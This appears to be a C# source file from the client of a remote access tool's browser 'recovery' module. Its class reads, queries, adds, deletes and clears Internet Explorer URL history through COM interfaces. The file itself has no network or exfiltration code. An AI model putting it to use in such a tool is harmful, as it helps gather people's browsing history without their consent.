using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

public class ExplorerUrlHistory : IDisposable
{
	public class STATURLEnumerator
	{
		private readonly IEnumSTATURL _enumerator;

		private int _index;

		private STATURL _staturl;

		public STATURL Current => _staturl;

		public STATURLEnumerator(IEnumSTATURL enumerator)
		{
			_enumerator = enumerator;
		}

		public bool MoveNext()
		{
			_staturl = default(STATURL);
			_enumerator.Next(1, ref _staturl, out _index);
			if (_index == 0)
			{
				return false;
			}
			return true;
		}

		public void Skip(int celt)
		{
			_enumerator.Skip(celt);
		}

		public void Reset()
		{
			_enumerator.Reset();
		}

		public STATURLEnumerator Clone()
		{
			_enumerator.Clone(out var ppenum);
			return new STATURLEnumerator(ppenum);
		}

		public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
		{
			_enumerator.SetFilter(poszFilter, dwFlags);
		}

		public void GetUrlHistory(IList list)
		{
			while (true)
			{
				_staturl = default(STATURL);
				_enumerator.Next(1, ref _staturl, out _index);
				if (_index == 0)
				{
					break;
				}
				list.Add(_staturl);
			}
			_enumerator.Reset();
		}
	}

	private readonly IUrlHistoryStg2 obj;

	private UrlHistoryClass urlHistory;

	private List<STATURL> _urlHistoryList;

	public int Count => _urlHistoryList.Count;

	public STATURL this[int index]
	{
		get
		{
			if (index < _urlHistoryList.Count && index >= 0)
			{
				return _urlHistoryList[index];
			}
			throw new IndexOutOfRangeException();
		}
		set
		{
			if (index < _urlHistoryList.Count && index >= 0)
			{
				_urlHistoryList[index] = value;
				return;
			}
			throw new IndexOutOfRangeException();
		}
	}

	public ExplorerUrlHistory()
	{
		urlHistory = new UrlHistoryClass();
		obj = (IUrlHistoryStg2)urlHistory;
		STATURLEnumerator sTATURLEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
		_urlHistoryList = new List<STATURL>();
		sTATURLEnumerator.GetUrlHistory(_urlHistoryList);
	}

	public void Dispose()
	{
		Marshal.ReleaseComObject(obj);
		urlHistory = null;
	}

	public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
	{
		obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
	}

	public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
	{
		try
		{
			obj.DeleteUrl(pocsUrl, dwFlags);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
	{
		STATURL lpSTATURL = default(STATURL);
		try
		{
			obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
			return lpSTATURL;
		}
		catch (FileNotFoundException)
		{
			return lpSTATURL;
		}
	}

	public void ClearHistory()
	{
		obj.ClearHistory();
	}

	public STATURLEnumerator GetEnumerator()
	{
		return new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
	}
}
